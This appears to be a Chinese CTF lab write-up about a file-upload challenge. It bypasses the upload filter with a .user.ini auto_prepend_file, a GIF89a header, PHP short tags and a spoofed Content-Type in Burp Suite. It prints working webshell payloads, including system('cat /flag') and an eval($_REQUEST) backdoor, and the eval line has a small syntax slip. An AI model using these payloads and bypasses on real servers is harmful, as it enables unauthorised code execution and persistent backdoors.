# 文件上传

又学到新知识辣

首先得要了解以下知识：

user.ini是php配置文件之一，可以由用户自定义的php.ini。在其中有两个比较特殊的配置项：

auto_prepend_file=1.jpg

auto_append_file=1.jpg

1.jpg就是我们想要包含的文件，user.ini可以让所有php文件都自动包含某个文件，可以是正常php文件，也可以是有一句话木马的webshell(后门脚本)。（更多与user.ini有关的内容可以点击这里查看，[user.ini文件构成的php后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)）

---

对于这样的一题文件上传题，需要通过user.ini配置文件来上传webshell以控制后台。

打开靶机，需要我们上传文件，立马打开phpstorm(实际上不需要，记事本就行)写了个一句话脚本，命名为1.php

`<?php system ('ls /');?>`

上传发现被过滤了，web小白不知道咋回事，请教大佬明白了是php文件被过滤了，这里使用短标签绕过，再把文件后缀改成jpg就可以绕过这一层过滤了，记得把文件的第一行改成gif_（就是把php 换成=，记得把空格也去掉）_

`gif89a `
`<?=system ('ls /');?>`

但是做到这里还不够，直接上传的webshell并不会自己执行，我们还需要上传一个user.ini把这个文件包含进去。构造user.ini:

`gif89a `
`auto_prepend_file=1.jpg`

但是做到这里也不够，因为上传以后他会说your file looked wicked，这个时候要去抓包更改一下文件类型，打开burpsuit，在http代理这里有一个拦截，把电脑的端口换成8080（burpsuit用的端口），然后点这个intercept off就打开了，打开以后再上传文件，就能拦截下来一个post请求

![image-20250423212242418](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423212242418.png)

再把这个content-type改成image/jpg（其实改成jpg就行），然后再放行，就可以了。

**这里注意一下，要先上传user.ini，再上传1.jpg**

![image-20250423212346064](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423212346064.png)

接下来打开kali来查一查有什么目录是可以进的，这里不用dirsearch，用dirb，当然建议都试一下，因为有时候dirsearch扫出来的目录比dirb的要少，dirsearch不太行的时候用dirb扫出来的就能进。

(dirb:该工具根据用户提供的字典,对目标网站目录进行暴力猜测。 它会尝试以递归方式进行爆破,以发现更多的路径。）（dirsearch 是一个基于python的高级命令行工具， 旨在对web服务器中的目录和文件进行暴力破解。)

![image-20250423213125380](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423213125380.png)

扫出来了一个url + /uploads/index.php，打开就是我们上传文件所在位置，如果是system('ls /')的话就会把文件目录列出来，

![image-20250423215037246](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423215037246.png)

发现这里有一个flag的文件，我们直接把上传的一句话木马改成

`gif89a`
`<?=system('cat /flag');?>`

再次上传,就可以在这个位置看到flag

![image-20250423215136364](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423215136364.png)

tips:这里可能会因为网络问题靶机没那么快收到咱传上去的消息，博主试了好多次发现的，这个靶机貌似不是很稳定

---

或者咱们换个方法，使用中国蚁剑来查找后台文件。

把上传的1.jpg图片内容改成

`GIF89a
<?=eval($_REQUEST['123'];?>`

文件内容就是在靶机后台放了个后门，给了咱一个访问点

user.ini还是一样的抓包上传

然后还是kali使用dirb扫一下靶机的url，就能扫出来url + /uploads/index.php

打开中国蚁剑，右键添加这样的数据

![image-20250423231022771](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423231022771.png)

然后在打开就可以访问靶机的目录了

![image-20250423231352856](C:\Users\cloud\AppData\Roaming\Typora\typora-user-images\image-20250423231352856.png)

flag就在这里，打开就能看到(当然同样不稳定，一会打得开一会打不开的，好像是过一会就得重新上传文件才能进)